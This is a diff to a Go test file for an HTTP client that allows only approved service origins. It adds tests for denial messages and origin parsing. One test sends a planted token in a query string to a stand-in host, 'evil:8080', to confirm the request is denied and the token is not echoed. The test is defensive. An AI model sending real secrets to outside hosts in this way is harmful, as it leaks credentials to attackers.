@@ -21,6 +21,8 @@ const planted = "PLANTED-token-7f3a9c"
 var httpMutations = []porttest.Mutation{
 	{"requests outside the allowed origins are rejected", "remove the origin check", "red: requests to another host, an IP, or https pass", "TestOnlyAllowedServiceNamesPassAndOtherHostsIPsHTTPSOrRelativePathsArePortDenied"},
 	{"rejected requests are not counted", "increment Sent before the check", "red: Sent is not 0 after rejected requests", "TestOnlyAllowedServiceNamesPassAndOtherHostsIPsHTTPSOrRelativePathsArePortDenied"},
+	{"a denial says how to allow the origin", "drop the env.json hint from the denial message", "red: the message does not mention env.json", "TestDeniedOriginMessageNamesTheTargetAndHowToAllowIt"},
+	{"only bare service origins count as origins", "accept any URL in Origin", "red: an IP, a path or ftp yields an origin", "TestOriginAcceptsSchemeHostAndPortOnly"},
 	{"redirects are rejected", "remove the 3xx check", "red: a 302 response comes back as a Response", "TestRedirectResponseIsPortDeniedAndCountsAsSent"},
 	{"time limit", "remove WithTimeout", "red: the test hangs on a slow server", "TestExceedingTheTimeLimitIsPortTimeoutAndResponsesWithinItPassThrough"},
 	{"body size limit", "remove LimitReader", "red: a body over the limit comes back as is", "TestBodyOverTheLimitIsPortLimitAndBodyWithinItIsNotTruncated"},
@@ -104,6 +106,27 @@ func TestOnlyAllowedServiceNamesPassAndOtherHostsIPsHTTPSOrRelativePathsArePortD
 	}
 	if _, err := c.Send(context.Background(), Request{Method: "GET", URL: "http://mock:9090/echo"}); err != nil {
 		t.Fatalf("second allowed origin: %v", err)
+	}
+}
+
+func TestDeniedOriginMessageNamesTheTargetAndHowToAllowIt(t *testing.T) {
+	c, _ := server(t)
+	_, err := c.Send(context.Background(), Request{Method: "GET", URL: "http://evil:8080/echo?token=" + planted})
+	if codeOf(err) != engine.PortDenied || !strings.Contains(err.Error(), "GET /echo") || !strings.Contains(err.Error(), "as a value in env.json") || strings.Contains(err.Error(), planted) {
+		t.Fatalf("%v", err)
+	}
+}
+
+func TestOriginAcceptsSchemeHostAndPortOnly(t *testing.T) {
+	for in, want := range map[string]string{"http://web": "http://web", "http://web:8080/": "http://web:8080", "https://api.local": "https://api.local"} {
+		if got, ok := Origin(in); !ok || got != want {
+			t.Fatalf("%s: %q %v", in, got, ok)
+		}
+	}
+	for _, in := range []string{"http://web/api", "http://127.0.0.1:8080", "ftp://web", "web:8080", "", "http://"} {
+		if got, ok := Origin(in); ok {
+			t.Fatalf("%s accepted as %q", in, got)
+		}
 	}
 }
 
